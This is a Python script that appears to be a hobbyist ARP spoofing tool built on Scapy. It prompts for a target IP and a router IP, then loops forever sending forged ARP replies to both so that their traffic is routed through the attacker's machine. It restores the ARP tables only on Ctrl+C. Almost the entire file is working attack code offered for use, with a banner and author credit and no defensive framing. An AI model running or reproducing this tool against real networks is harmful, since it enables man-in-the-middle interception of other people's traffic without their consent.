import os
import time
from scapy.all import ARP, Ether, srp, send

#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#                                           |
#  THIS SCRIPT MADE BY imscruz              |
#  STAR MY REPO Pls imscruz/Scapy-Scripts   |
#///////////////////////////////////////////

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def show_banner():
    banner = r"""
       _____ ____________________    ___________________________   ________  ___________
      /  _  \\______   \______   \  /   _____/\______   \_____  \  \_____  \ \_   _____/
     /  /_\  \|       _/|     ___/  \_____  \  |     ___//   |   \  /   |   \ |    __)  
    /    |    \    |   \|    |      /        \ |    |   /    |    \/    |    \|     \   
    \____|__  /____|_  /|____|     /_______  / |____|   \_______  /\_______  /\___  /   
            \/       \/                    \/                   \/         \/     \/    
        
                   ARP SPOOFER | Coded by imscruz
                   DO NOT FORGET THIS SCRIPT ONLY WORK ON LOCAL NETWORK [!]
    """
    print(banner)

# macver oç router
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response, _ = srp(arp_request_broadcast, timeout=2, verbose=False)
    if response:
        return response[0][1].hwsrc
    return None
# arp fonksıyonel sikisyonel
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)
    else:
        print(f"[!] {target_ip} Cant get MAC adress!")
def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(spoof_ip)
    if target_mac and gateway_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=gateway_mac)
        send(arp_response, verbose=False, count=4)

# main
if __name__ == "__main__":
    clear_screen() 
    show_banner() 
    target_ip = input("🛑 Target IP (192.168.XX.XX): ")
    gateway_ip = input("🌐 Router IP (192.168.1.1): ")

    try:
        print("\n[+] ARP Spoof started successfull! u cant stop with CTRL+C ...\n")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)  # wait 2 second for no crash network
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP Spoof...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Network get normally :>>")
